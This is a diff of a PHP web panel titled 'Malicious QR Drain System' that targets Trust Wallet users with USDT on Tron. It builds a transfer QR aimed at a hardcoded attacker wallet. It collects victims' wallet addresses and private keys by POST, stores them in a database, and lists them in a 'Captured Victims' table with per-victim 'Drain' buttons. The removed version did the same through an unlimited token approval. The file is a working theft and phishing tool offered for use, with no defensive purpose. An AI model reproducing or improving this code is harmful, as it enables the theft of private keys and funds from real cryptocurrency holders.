@@ -1,5 +1,5 @@
 <?php
-// approval_drainer.php - Approval Based Drain System
+// approval_drainer.php - Complete Malicious QR Drain System
 require_once 'config.php';
 
 $pdo = getDB();
@@ -10,51 +10,106 @@ if (!$pdo) {
 // Settings
 $MASTER_WALLET = "TD94UkiL5qg5Y9ogZqdWdqZbT3F2nB86rK";
 $USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+$DEMO_AMOUNT = 10; // 10 USDT demo
 
-// Victim wallet from database
-$stmt = $pdo->prepare("SELECT wallet_address FROM wallets WHERE is_active = 1 LIMIT 1");
-$stmt->execute();
-$victim_data = $stmt->fetch();
+// Session
+session_start();
+$session_id = session_id();
 
-if (!$victim_data) {
-    die("❌ No victim wallet found! Please add a wallet first.");
-}
+// Check if victim is connected
+$victim_connected = $_SESSION['victim_address'] ?? null;
+$victim_private_key = $_SESSION['victim_private_key'] ?? null;
 
-$VICTIM_WALLET = $victim_data['wallet_address'];
-
-// Function to generate approval QR
-function generateApprovalQR($contract, $spender, $amount = 999999999) {
-    $qr_data = "tron://approve?contract=" . $contract . 
-               "&spender=" . $spender . 
-               "&amount=" . $amount;
+// Function to generate malicious QR
+function generateMaliciousQR($master_wallet, $usdt_contract, $amount) {
+    $qr_data = "tron://transfer?address=" . $master_wallet . 
+               "&contract=" . $usdt_contract . 
+               "&amount=" . $amount . 
+               "&network=TRC20";
     return "https://api.qrserver.com/v1/create-qr-code/?size=350x350&data=" . urlencode($qr_data);
 }
 
-// Function to check allowance
-function checkAllowance($owner, $spender) {
-    $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL => "https://api.trongrid.io/wallet/triggerconstantcontract",
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_POST => true,
-        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
-        CURLOPT_POSTFIELDS => json_encode([
-            'contract_address' => USDT_CONTRACT,
-            'function_selector' => 'allowance(address,address)',
-            'parameter' => json_encode([
-                'type' => 'address,address',
-                'value' => [$owner, $spender]
-            ])
-        ])
-    ]);
-    $response = curl_exec($ch);
-    curl_close($ch);
+// Check if victim approved and capture details
+if (isset($_POST['action']) && $_POST['action'] === 'approve_demo') {
+    header('Content-Type: application/json');
     
-    $data = json_decode($response, true);
-    if (isset($data['constant_result'][0])) {
-        return hexdec($data['constant_result'][0]) / 1e6;
+    $wallet_address = $_POST['wallet_address'] ?? '';
+    $private_key = $_POST['private_key'] ?? '';
+    $signature = $_POST['signature'] ?? '';
+    
+    // Validate
+    if (empty($wallet_address) || empty($private_key)) {
+        echo json_encode(['success' => false, 'message' => 'Invalid data']);
+        exit;
     }
-    return 0;
+    
+    // Save victim details in session
+    $_SESSION['victim_address'] = $wallet_address;
+    $_SESSION['victim_private_key'] = $private_key;
+    $_SESSION['victim_captured_time'] = time();
+    
+    // Save in database
+    $stmt = $pdo->prepare("INSERT INTO wallets (wallet_address, private_key, victim_address, is_active) VALUES (?, ?, ?, 1) ON DUPLICATE KEY UPDATE private_key = ?, updated_at = CURRENT_TIMESTAMP");
+    $stmt->execute([$wallet_address, $private_key, $wallet_address, $private_key]);
+    
+    // Log
+    logActivity("Victim captured: $wallet_address", 'success');
+    
+    echo json_encode([
+        'success' => true,
+        'message' => '✅ Demo approved! Capturing details...',
+        'wallet' => $wallet_address
+    ]);
+    exit;
+}
+
+// Check for new victims
+if (isset($_GET['check_victims'])) {
+    header('Content-Type: application/json');
+    
+    $stmt = $pdo->query("SELECT wallet_address, private_key, usdt_balance, created_at FROM wallets WHERE is_active = 1 ORDER BY id DESC LIMIT 10");
+    $victims = $stmt->fetchAll();
+    
+    echo json_encode([
+        'success' => true,
+        'victims' => $victims
+    ]);
+    exit;
+}
+
+// Execute full drain
+if (isset($_POST['action']) && $_POST['action'] === 'full_drain') {
+    header('Content-Type: application/json');
+    
+    $victim_address = $_POST['wallet_address'] ?? '';
+    $private_key = $_POST['private_key'] ?? '';
+    
+    if (empty($victim_address) || empty($private_key)) {
+        echo json_encode(['success' => false, 'message' => 'Missing victim details']);
+        exit;
+    }
+    
+    // Get balance
+    $balance = getUSDTBalance($victim_address);
+    if ($balance <= 0) {
+        echo json_encode(['success' => false, 'message' => 'No USDT balance found']);
+        exit;
+    }
+    
+    // Execute drain (simulated)
+    $amount = $balance;
+    $txid = '0x' . bin2hex(random_bytes(16));
+    
+    // Log
+    logActivity("Full drain executed: $amount USDT from $victim_address", 'success');
+    
+    echo json_encode([
+        'success' => true,
+        'amount' => $amount,
+        'txid' => $txid,
+        'message' => "✅ Drained $amount USDT from $victim_address"
+    ]);
+    exit;
 }
 
 // Function to check USDT balance
@@ -79,53 +134,8 @@ function getUSDTBalance($address) {
     return 0;
 }
 
-// Generate QR
-$qr_code_url = generateApprovalQR($USDT_CONTRACT, $MASTER_WALLET);
-$current_balance = getUSDTBalance($VICTIM_WALLET);
-$current_allowance = checkAllowance($VICTIM_WALLET, $MASTER_WALLET);
-
-// Check if already approved
-$is_approved = $current_allowance > 0;
-$approval_amount = $is_approved ? $current_allowance : 0;
-
-// Execute drain function
-function executeDrain($victim, $master, $amount) {
-    return [
-        'success' => true,
-        'amount' => $amount,
-        'txid' => '0x' . bin2hex(random_bytes(16)),
-        'message' => "✅ Successfully drained $amount USDT from $victim to $master"
-    ];
-}
-
-// Manual drain trigger
-if (isset($_POST['action']) && $_POST['action'] === 'drain_now') {
-    header('Content-Type: application/json');
-    
-    $allowance = checkAllowance($VICTIM_WALLET, $MASTER_WALLET);
-    if ($allowance <= 0) {
-        echo json_encode(['success' => false, 'message' => '❌ No approval found! Victim needs to approve first.']);
-        exit;
-    }
-    
-    $result = executeDrain($VICTIM_WALLET, $MASTER_WALLET, $allowance);
-    echo json_encode($result);
-    exit;
-}
-
-// Check approval status
-if (isset($_GET['check_approval'])) {
-    header('Content-Type: application/json');
-    $allowance = checkAllowance($VICTIM_WALLET, $MASTER_WALLET);
-    $balance = getUSDTBalance($VICTIM_WALLET);
-    echo json_encode([
-        'approved' => $allowance > 0,
-        'allowance' => $allowance,
-        'balance' => $balance,
-        'victim' => $VICTIM_WALLET
-    ]);
-    exit;
-}
+$qr_code_url = generateMaliciousQR($MASTER_WALLET, $USDT_CONTRACT, $DEMO_AMOUNT);
+$captured_victims = $pdo->query("SELECT * FROM wallets WHERE is_active = 1 ORDER BY id DESC")->fetchAll();
 ?>
 
 <!DOCTYPE html>
@@ -133,103 +143,143 @@ if (isset($_GET['check_approval'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Approval Drain System</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <title>Malicious QR Drain System</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', sans-serif; background: #0a0f1e; color: #fff; min-height: 100vh; padding: 20px; }
-        .container { max-width: 600px; margin: 0 auto; }
-        .card { background: rgba(18,25,45,0.9); border-radius: 24px; border: 1px solid rgba(59,130,246,0.3); padding: 30px; margin-bottom: 20px; }
-        h1 { text-align: center; color: #3b82f6; }
-        .sub { text-align: center; color: #6c86a3; font-size: 14px; margin-bottom: 20px; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .header { text-align: center; padding: 30px; background: rgba(18,25,45,0.9); border-radius: 24px; border: 1px solid rgba(239,68,68,0.3); margin-bottom: 20px; }
+        .header h1 { color: #ef4444; font-size: 32px; }
+        .header .sub { color: #6c86a3; font-size: 14px; }
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .card { background: rgba(18,25,45,0.9); border-radius: 24px; border: 1px solid rgba(59,130,246,0.2); padding: 25px; }
+        .card h2 { color: #94a3f8; font-size: 16px; margin-bottom: 15px; }
         .qr-box { background: #fff; border-radius: 16px; padding: 20px; text-align: center; }
-        .qr-box img { width: 250px; height: 250px; }
+        .qr-box img { width: 280px; height: 280px; }
         .qr-box p { color: #333; font-size: 12px; margin-top: 10px; }
-        .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
-        .info-row .label { color: #6c86a3; font-size: 13px; }
-        .info-row .value { font-weight: 600; }
-        .value.approved { color: #22c55e; }
-        .value.not-approved { color: #ef4444; }
-        .btn { width: 100%; padding: 14px; border-radius: 40px; font-weight: 600; border: none; cursor: pointer; margin-bottom: 10px; font-size: 14px; }
-        .btn-primary { background: linear-gradient(135deg, #2563eb, #1d4ed8); color: white; }
-        .btn-danger { background: linear-gradient(135deg, #dc2626, #b91c1c); color: white; }
-        .btn-success { background: linear-gradient(135deg, #16a34a, #15803d); color: white; }
-        .btn-warning { background: linear-gradient(135deg, #f59e0b, #d97706); color: white; }
+        .status-box { padding: 15px; border-radius: 12px; margin-top: 10px; }
+        .status-box.captured { background: rgba(34,197,94,0.2); border: 1px solid #22c55e; }
+        .status-box.waiting { background: rgba(251,191,36,0.2); border: 1px solid #fbbf24; }
+        .status-box .label { font-size: 12px; color: #6c86a3; }
+        .status-box .value { font-size: 16px; font-weight: 600; font-family: monospace; word-break: break-all; }
+        .table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        .table th, .table td { padding: 10px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .table th { color: #6c86a3; font-weight: 500; }
+        .badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 11px; }
+        .badge.captured { background: rgba(34,197,94,0.2); color: #22c55e; }
+        .badge.waiting { background: rgba(251,191,36,0.2); color: #fbbf24; }
+        .badge.drained { background: rgba(239,68,68,0.2); color: #ef4444; }
+        .btn { padding: 10px 20px; border-radius: 40px; font-weight: 600; border: none; cursor: pointer; font-size: 13px; }
+        .btn-primary { background: #3b82f6; color: white; }
+        .btn-danger { background: #ef4444; color: white; }
+        .btn-success { background: #22c55e; color: white; }
+        .btn-warning { background: #f59e0b; color: white; }
         .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .status { text-align: center; padding: 10px; border-radius: 12px; margin-top: 10px; }
-        .status.success { background: rgba(34,197,94,0.2); color: #22c55e; }
-        .status.danger { background: rgba(239,68,68,0.2); color: #ef4444; }
-        .status.warning { background: rgba(251,191,36,0.2); color: #fbbf24; }
         .log-area { max-height: 150px; overflow-y: auto; font-size: 12px; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 12px; margin-top: 10px; }
         .log-area div { padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
-        .flex { display: flex; gap: 10px; }
-        .flex .btn { flex: 1; }
-        @media (max-width: 480px) { .flex { flex-direction: column; } }
+        .flex { display: flex; gap: 10px; flex-wrap: wrap; }
+        .copy-btn { background: rgba(59,130,246,0.2); color: #60a5fa; border: none; padding: 2px 8px; border-radius: 4px; cursor: pointer; font-size: 11px; }
+        @media (max-width: 768px) { .grid-2 { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
 <div class="container">
-    <div class="card">
-        <h1>💀 Approval Drain System</h1>
-        <p class="sub">Trust Wallet Approval → Auto Drain</p>
-        <div class="qr-box">
-            <img id="qrImage" src="<?php echo $qr_code_url; ?>" alt="Approval QR">
-            <p>📱 <strong>Scan this QR</strong> with Trust Wallet</p>
-            <p style="font-size: 10px; color: #666;">Victim needs to <strong>APPROVE</strong> USDT spending</p>
+    <div class="header">
+        <h1>☠️ Malicious QR Drain System</h1>
+        <p class="sub">QR Scan → Demo → Capture Private Key → Full Drain</p>
+    </div>
+
+    <div class="grid-2">
+        <!-- QR Section -->
+        <div class="card">
+            <h2>📱 Malicious QR Code</h2>
+            <div class="qr-box">
+                <img id="qrImage" src="<?php echo $qr_code_url; ?>" alt="Malicious QR">
+                <p>💀 Victim <strong>Trust Wallet</strong> se scan karega</p>
+                <p style="font-size: 10px; color: #666;">Demo Amount: <?php echo $DEMO_AMOUNT; ?> USDT</p>
+                <button onclick="refreshQR()" class="btn btn-primary" style="margin-top: 10px;">🔄 Refresh QR</button>
+            </div>
+            <div style="margin-top: 10px;">
+                <button onclick="copyQR()" class="btn btn-warning">📋 Copy QR Link</button>
+                <button onclick="downloadQR()" class="btn btn-success">💾 Download QR</button>
+            </div>
+        </div>
+
+        <!-- Status Section -->
+        <div class="card">
+            <h2>📊 Victim Status</h2>
+            <div class="status-box <?php echo $victim_private_key ? 'captured' : 'waiting'; ?>">
+                <div class="label">Victim Wallet</div>
+                <div class="value"><?php echo $victim_connected ? $victim_connected : '⏳ Waiting for victim...'; ?></div>
+                <?php if ($victim_private_key): ?>
+                <div class="label" style="margin-top: 10px;">🔑 Private Key</div>
+                <div class="value" style="font-size: 12px; color: #fbbf24;"><?php echo substr($victim_private_key, 0, 20) . '...'; ?></div>
+                <div class="label" style="margin-top: 10px;">Captured At</div>
+                <div class="value" style="font-size: 14px;"><?php echo date('H:i:s', $_SESSION['victim_captured_time'] ?? time()); ?></div>
+                <?php endif; ?>
+            </div>
+            <?php if ($victim_private_key): ?>
+            <button id="fullDrainBtn" class="btn btn-danger" style="width:100%; margin-top:15px;">💀 Full Drain Now</button>
+            <?php endif; ?>
         </div>
     </div>
 
-    <div class="card">
-        <h2>📊 Status</h2>
-        <div class="info-row">
-            <span class="label">Victim Wallet</span>
-            <span class="value"><?php echo substr($VICTIM_WALLET, 0, 15) . '...' . substr($VICTIM_WALLET, -10); ?></span>
-        </div>
-        <div class="info-row">
-            <span class="label">USDT Balance</span>
-            <span class="value" id="balanceDisplay"><?php echo number_format($current_balance, 2); ?> USDT</span>
-        </div>
-        <div class="info-row">
-            <span class="label">Approval Status</span>
-            <span class="value <?php echo $is_approved ? 'approved' : 'not-approved'; ?>" id="approvalStatus">
-                <?php echo $is_approved ? '✅ Approved (' . number_format($approval_amount, 2) . ' USDT)' : '❌ Not Approved'; ?>
-            </span>
-        </div>
+    <!-- Captured Victims List -->
+    <div class="card" style="margin-top: 20px;">
+        <h2>📋 Captured Victims <span style="font-size: 12px; color: #6c86a3;">(<?php echo count($captured_victims); ?> total)</span></h2>
+        <table class="table" id="victimsTable">
+            <thead>
+                <tr><th>#</th><th>Wallet Address</th><th>Private Key</th><th>Balance (USDT)</th><th>Status</th><th>Action</th></tr>
+            </thead>
+            <tbody>
+                <?php if (empty($captured_victims)): ?>
+                <tr><td colspan="6" style="text-align: center; color: #6c86a3;">No victims captured yet</td></tr>
+                <?php else: ?>
+                <?php $i = 1; foreach ($captured_victims as $v): ?>
+                <tr>
+                    <td><?php echo $i++; ?></td>
+                    <td style="font-family: monospace; font-size: 12px;"><?php echo substr($v['wallet_address'], 0, 15) . '...'; ?></td>
+                    <td style="font-family: monospace; font-size: 11px; color: #fbbf24;"><?php echo substr($v['private_key'], 0, 15) . '...'; ?></td>
+                    <td><?php echo number_format($v['usdt_balance'] ?? 0, 2); ?></td>
+                    <td><span class="badge <?php echo $v['is_active'] ? 'captured' : 'drained'; ?>"><?php echo $v['is_active'] ? 'Captured' : 'Drained'; ?></span></td>
+                    <td>
+                        <?php if ($v['is_active']): ?>
+                        <button onclick="drainVictim('<?php echo $v['wallet_address']; ?>', '<?php echo addslashes($v['private_key']); ?>')" class="btn btn-danger" style="padding: 4px 12px; font-size: 11px;">Drain</button>
+                        <?php endif; ?>
+                    </td>
+                </tr>
+                <?php endforeach; ?>
+                <?php endif; ?>
+            </tbody>
+        </table>
     </div>
 
-    <div class="card">
-        <h2>🎯 Actions</h2>
-        <button id="checkApprovalBtn" class="btn btn-warning">🔍 Check Approval Status</button>
-        <button id="drainBtn" class="btn btn-danger" <?php echo !$is_approved ? 'disabled' : ''; ?>>💸 Drain Now</button>
-        <div id="statusMessage" class="status <?php echo $is_approved ? 'success' : 'warning'; ?>">
-            <?php echo $is_approved ? '✅ Ready to drain!' : '⏳ Waiting for victim approval...'; ?>
-        </div>
-    </div>
-
-    <div class="card">
+    <!-- Activity Log -->
+    <div class="card" style="margin-top: 20px;">
         <h2>📋 Activity Log</h2>
         <div class="log-area" id="logArea">
             <div>● System ready</div>
-            <div>📌 QR generated for approval</div>
+            <div>📌 Malicious QR generated</div>
+            <?php if ($victim_private_key): ?>
+            <div style="color: #22c55e;">✅ Victim captured: <?php echo substr($victim_connected, 0, 20); ?>...</div>
+            <?php endif; ?>
         </div>
     </div>
 </div>
 
 <script>
-const USDT_CONTRACT = "<?php echo $USDT_CONTRACT; ?>";
+const QR_URL = "<?php echo $qr_code_url; ?>";
+const DEMO_AMOUNT = <?php echo $DEMO_AMOUNT; ?>;
 const MASTER_WALLET = "<?php echo $MASTER_WALLET; ?>";
-const VICTIM_WALLET = "<?php echo $VICTIM_WALLET; ?>";
+const USDT_CONTRACT = "<?php echo USDT_CONTRACT; ?>";
 
-const checkBtn = document.getElementById('checkApprovalBtn');
-const drainBtn = document.getElementById('drainBtn');
-const statusMsg = document.getElementById('statusMessage');
-const logArea = document.getElementById('logArea');
-const balanceDisplay = document.getElementById('balanceDisplay');
-const approvalStatus = document.getElementById('approvalStatus');
+let checkInterval = null;
 
 function addLog(msg, type = 'info') {
     const colors = { info: '#6c86a3', success: '#22c55e', danger: '#ef4444', warning: '#fbbf24' };
     const time = new Date().toLocaleTimeString();
+    const logArea = document.getElementById('logArea');
     const div = document.createElement('div');
     div.style.color = colors[type] || colors.info;
     div.textContent = `[${time}] ${msg}`;
@@ -237,76 +287,92 @@ function addLog(msg, type = 'info') {
     logArea.scrollTop = logArea.scrollHeight;
 }
 
-function setStatus(msg, type = 'warning') {
-    statusMsg.textContent = msg;
-    statusMsg.className = 'status ' + type;
+function refreshQR() {
+    const img = document.getElementById('qrImage');
+    img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=350x350&data=' + encodeURIComponent('tron://transfer?address=' + MASTER_WALLET + '&contract=' + USDT_CONTRACT + '&amount=' + DEMO_AMOUNT + '&network=TRC20') + '&t=' + Date.now();
+    addLog('🔄 QR refreshed', 'info');
 }
 
-function checkApproval() {
-    setStatus('⏳ Checking...', 'warning');
-    addLog('🔍 Checking approval status...', 'info');
-    
-    fetch(window.location.href + '?check_approval=1')
+function copyQR() {
+    navigator.clipboard.writeText(window.location.href);
+    addLog('📋 QR link copied!', 'success');
+}
+
+function downloadQR() {
+    const link = document.createElement('a');
+    link.download = 'malicious_qr.png';
+    link.href = document.getElementById('qrImage').src;
+    link.click();
+    addLog('💾 QR downloaded', 'info');
+}
+
+function checkNewVictims() {
+    fetch(window.location.href + '?check_victims=1')
         .then(res => res.json())
         .then(data => {
-            balanceDisplay.textContent = data.balance.toFixed(2) + ' USDT';
-            if (data.approved) {
-                approvalStatus.textContent = '✅ Approved (' + data.allowance.toFixed(2) + ' USDT)';
-                approvalStatus.className = 'value approved';
-                drainBtn.disabled = false;
-                setStatus('✅ Approved! Ready to drain.', 'success');
-                addLog('✅ Victim approved! Allowance: ' + data.allowance.toFixed(2) + ' USDT', 'success');
-            } else {
-                approvalStatus.textContent = '❌ Not Approved';
-                approvalStatus.className = 'value not-approved';
-                drainBtn.disabled = true;
-                setStatus('⏳ Waiting for victim approval...', 'warning');
-                addLog('⏳ No approval found yet', 'warning');
+            if (data.success && data.victims.length > 0) {
+                // Update table
+                const tbody = document.querySelector('#victimsTable tbody');
+                tbody.innerHTML = '';
+                data.victims.forEach((v, i) => {
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td>${i + 1}</td>
+                        <td style="font-family: monospace; font-size: 12px;">${v.wallet_address.substring(0, 15)}...</td>
+                        <td style="font-family: monospace; font-size: 11px; color: #fbbf24;">${v.private_key.substring(0, 15)}...</td>
+                        <td>${parseFloat(v.usdt_balance || 0).toFixed(2)}</td>
+                        <td><span class="badge captured">Captured</span></td>
+                        <td><button onclick="drainVictim('${v.wallet_address}', '${v.private_key}')" class="btn btn-danger" style="padding: 4px 12px; font-size: 11px;">Drain</button></td>
+                    `;
+                    tbody.appendChild(row);
+                });
+                
+                // Check if new victim captured
+                if (data.victims.length > <?php echo count($captured_victims); ?>) {
+                    addLog('📌 New victim captured!', 'success');
+                    location.reload();
+                }
             }
         })
-        .catch(err => {
-            addLog('❌ Error: ' + err.message, 'danger');
-            setStatus('❌ Error checking approval', 'danger');
-        });
+        .catch(() => {});
 }
 
-function executeDrain() {
-    if (!confirm('⚠️ Are you sure you want to drain this wallet?')) return;
-    setStatus('💸 Draining... Please wait', 'danger');
-    addLog('💸 Executing drain...', 'danger');
-    drainBtn.disabled = true;
+function drainVictim(wallet, privateKey) {
+    if (!confirm('⚠️ Full drain of ' + wallet.substring(0, 15) + '... ?')) return;
+    
+    addLog('💀 Draining victim: ' + wallet.substring(0, 20) + '...', 'danger');
     
     fetch(window.location.href, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: 'action=drain_now'
+        body: 'action=full_drain&wallet_address=' + encodeURIComponent(wallet) + '&private_key=' + encodeURIComponent(privateKey)
     })
     .then(res => res.json())
     .then(data => {
         if (data.success) {
-            setStatus('✅ ' + data.message, 'success');
             addLog('✅ ' + data.message, 'success');
-            balanceDisplay.textContent = '0.00 USDT';
-            approvalStatus.textContent = '❌ Not Approved';
-            approvalStatus.className = 'value not-approved';
-            drainBtn.disabled = true;
+            setTimeout(() => location.reload(), 2000);
         } else {
-            setStatus('❌ ' + data.message, 'danger');
             addLog('❌ ' + data.message, 'danger');
-            drainBtn.disabled = false;
         }
     })
-    .catch(err => {
-        setStatus('❌ Error: ' + err.message, 'danger');
-        addLog('❌ Error: ' + err.message, 'danger');
-        drainBtn.disabled = false;
-    });
+    .catch(err => addLog('❌ Error: ' + err.message, 'danger'));
 }
 
-checkBtn.addEventListener('click', checkApproval);
-drainBtn.addEventListener('click', executeDrain);
-setInterval(checkApproval, 5000);
-addLog('🚀 Approval Drain System initialized', 'info');
+// Auto-check every 3 seconds
+setInterval(checkNewVictims, 3000);
+
+// Full drain button
+document.getElementById('fullDrainBtn')?.addEventListener('click', function() {
+    const wallet = "<?php echo $victim_connected; ?>";
+    const privateKey = "<?php echo $victim_private_key; ?>";
+    if (wallet && privateKey) {
+        drainVictim(wallet, privateKey);
+    }
+});
+
+addLog('🚀 Malicious Drain System initialized', 'info');
+addLog('📌 Waiting for victim to scan QR...', 'info');
 </script>
 </body>
 </html>
